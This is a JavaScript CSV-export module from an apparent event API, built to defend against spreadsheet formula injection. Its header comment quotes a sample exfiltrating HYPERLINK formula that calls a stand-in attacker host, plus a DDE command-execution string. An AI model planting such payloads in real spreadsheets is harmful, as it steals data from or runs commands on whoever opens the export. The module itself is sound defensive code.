/**
 * CSV, written so a spreadsheet cannot be turned into a weapon.
 *
 * ## The attack this exists for
 *
 * A cell whose text begins `=`, `+`, `-`, `@`, a tab or a carriage return is
 * read by Excel, LibreOffice and Google Sheets as a *formula* rather than as
 * text. `=HYPERLINK("http://attacker.example/?"&A1,"Click")` in an event title
 * becomes a working link that exfiltrates the row next to it; `=cmd|'/c
 * calc'!A0` has historically executed. The person harmed is whoever opened the
 * export, which is the organiser or the accountant — not whoever typed the
 * title.
 *
 * So every value that could begin with one of those characters is prefixed with
 * an apostrophe, which every major spreadsheet treats as "this is text" and
 * does not display. Quoting alone does not help: the parser strips the quotes
 * and then reads the formula.
 *
 * ## What else is different from a naive join
 *
 *   - A field containing a comma, a quote or a newline is quoted, and an inner
 *     quote is doubled, per RFC 4180.
 *   - Rows are separated by CRLF, which is what RFC 4180 says and what Excel
 *     expects on Windows.
 *   - `null` and `undefined` become an empty field rather than the strings
 *     "null" and "undefined", which is what a finance person reads them as.
 *
 * ## What is not here
 *
 * Any column that names a card, a credential, a token or a buyer's address. The
 * column list is supplied by the caller and is an allow list; this module
 * refuses to invent one from an object's keys, because a schema that grows a
 * field would otherwise start exporting it.
 *
 * @module @desi-event/api/lib/csv
 */

/**
 * The characters a spreadsheet reads as the start of a formula.
 *
 * Tab and carriage return are on the list because a leading whitespace
 * character is stripped by some parsers before the next one is read, which
 * turns `\t=1+1` back into a formula.
 *
 * @type {ReadonlyArray<string>}
 */
export const FORMULA_PREFIXES = Object.freeze(['=', '+', '-', '@', '\t', '\r'])

/**
 * Make one value safe to put in a cell.
 *
 * @param {unknown} value Whatever the row held.
 * @returns {string} A field ready to be joined, quoted where it has to be.
 */
export function csvCell(value) {
  if (value === null || value === undefined) return ''

  const text = value instanceof Date ? value.toISOString() : String(value)
  // Prefixed, not stripped. Removing the character would change the data — a
  // negative amount really does start with a minus — and a report that quietly
  // rewrites figures is worse than one that displays an apostrophe.
  const guarded = FORMULA_PREFIXES.includes(text[0]) ? `'${text}` : text

  return /[",\r\n]/u.test(guarded) ? `"${guarded.replace(/"/gu, '""')}"` : guarded
}

/**
 * Render rows as CSV under an explicit column allow list.
 *
 * @param {object} options Options.
 * @param {ReadonlyArray<{key: string, header: string}>} options.columns What to export, in order.
 * @param {Iterable<object>} options.rows The rows.
 * @returns {string} A CRLF-separated document with a header row.
 * @throws {TypeError} When no columns are given, because an export with no allow list is not one.
 */
export function toCsv({ columns, rows }) {
  if (!Array.isArray(columns) || columns.length === 0) {
    throw new TypeError('An export needs an explicit column list.')
  }

  const lines = [columns.map((column) => csvCell(column.header)).join(',')]

  for (const row of rows) {
    lines.push(columns.map((column) => csvCell(row[column.key])).join(','))
  }

  return `${lines.join('\r\n')}\r\n`
}

/**
 * A filename a browser will save without argument.
 *
 * Deliberately narrow: anything outside the allowed set becomes a hyphen, so a
 * name derived from an organisation's own title cannot carry a quote, a
 * semicolon or a path separator into a `Content-Disposition` header.
 *
 * @param {string} stem What to call it, before the extension.
 * @param {string} isoDate The date to stamp it with.
 * @returns {string} A safe filename ending `.csv`.
 */
export function csvFilename(stem, isoDate) {
  const safe = String(stem)
    .toLowerCase()
    .replace(/[^a-z0-9]+/gu, '-')
    .replace(/^-+|-+$/gu, '')
    .slice(0, 60)

  return `${safe || 'export'}-${isoDate.slice(0, 10)}.csv`
}
